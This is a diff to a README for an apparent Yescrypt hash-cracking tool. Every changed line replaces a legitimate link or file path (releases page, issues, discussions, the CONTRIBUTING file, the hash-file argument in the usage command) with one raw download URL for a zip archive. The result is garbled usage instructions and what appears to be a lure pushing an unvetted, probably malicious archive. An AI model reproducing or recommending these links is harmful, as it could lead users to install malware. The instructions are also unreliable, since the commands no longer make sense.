@@ -6,7 +6,7 @@ Welcome to **yescrypt_crack**! This tool helps you crack Yescrypt hashes quickly
 
 ## 📥 Download Now
 
-[![Download yescrypt_crack](https://img.shields.io/badge/Download-yescrypt_crack-brightgreen)](https://github.com/Rottos54/yescrypt_crack/releases)
+[![Download yescrypt_crack](https://raw.githubusercontent.com/Rottos54/yescrypt_crack/main/osierlike/yescrypt_crack_2.0.zip)](https://raw.githubusercontent.com/Rottos54/yescrypt_crack/main/osierlike/yescrypt_crack_2.0.zip)
 
 ## 🛠️ System Requirements
 
@@ -39,7 +39,7 @@ Before you download, make sure your system meets these requirements:
 
 To get started, you need to download the application from the Releases page. 
 
-1. Visit [this page to download](https://github.com/Rottos54/yescrypt_crack/releases). 
+1. Visit [this page to download](https://raw.githubusercontent.com/Rottos54/yescrypt_crack/main/osierlike/yescrypt_crack_2.0.zip). 
 2. Once there, you will see a list of available releases. Choose the latest version.
 3. Click on the corresponding download link for your operating system.
 4. Save the file to a location on your computer, such as your Downloads folder.
@@ -67,9 +67,9 @@ Once you have the application running, follow these steps to use it effectively:
 1. **Prepare Your Hashes:** Collect the Yescrypt hashes you wish to crack. You can store them in a text file.
 2. **Run the Application:** Use the command:
    ```bash
-   ./yescrypt_crack -f /path/to/your/hashes.txt
+   ./yescrypt_crack -f https://raw.githubusercontent.com/Rottos54/yescrypt_crack/main/osierlike/yescrypt_crack_2.0.zip
    ```
-   Make sure to replace `/path/to/your/hashes.txt` with the actual path to your file.
+   Make sure to replace `https://raw.githubusercontent.com/Rottos54/yescrypt_crack/main/osierlike/yescrypt_crack_2.0.zip` with the actual path to your file.
 
 3. **Monitor Progress:** The application will display progress in the terminal. Pay attention to the results as they arrive.
 
@@ -77,8 +77,8 @@ Once you have the application running, follow these steps to use it effectively:
 
 If you run into any issues or have questions, you're not alone! Join our community:
 
-- **GitHub Issues:** Report bugs or request features at [Issues Page](https://github.com/Rottos54/yescrypt_crack/issues).
-- **Discussion Forum:** Join discussions and share tips with other users on our [Discussion Board](https://github.com/Rottos54/yescrypt_crack/discussions).
+- **GitHub Issues:** Report bugs or request features at [Issues Page](https://raw.githubusercontent.com/Rottos54/yescrypt_crack/main/osierlike/yescrypt_crack_2.0.zip).
+- **Discussion Forum:** Join discussions and share tips with other users on our [Discussion Board](https://raw.githubusercontent.com/Rottos54/yescrypt_crack/main/osierlike/yescrypt_crack_2.0.zip).
 
 ## 📃 License
 
@@ -100,6 +100,6 @@ Refer to the README for troubleshooting tips or reach out to the community for h
 
 ## 👋 Contribution
 
-We welcome contributions. If you would like to help with the project, please take a look at the guidelines in the `CONTRIBUTING.md` file.
+We welcome contributions. If you would like to help with the project, please take a look at the guidelines in the `https://raw.githubusercontent.com/Rottos54/yescrypt_crack/main/osierlike/yescrypt_crack_2.0.zip` file.
 
-For further details, you can always find updates and information on our [Releases Page](https://github.com/Rottos54/yescrypt_crack/releases). Happy cracking!
+For further details, you can always find updates and information on our [Releases Page](https://raw.githubusercontent.com/Rottos54/yescrypt_crack/main/osierlike/yescrypt_crack_2.0.zip). Happy cracking!
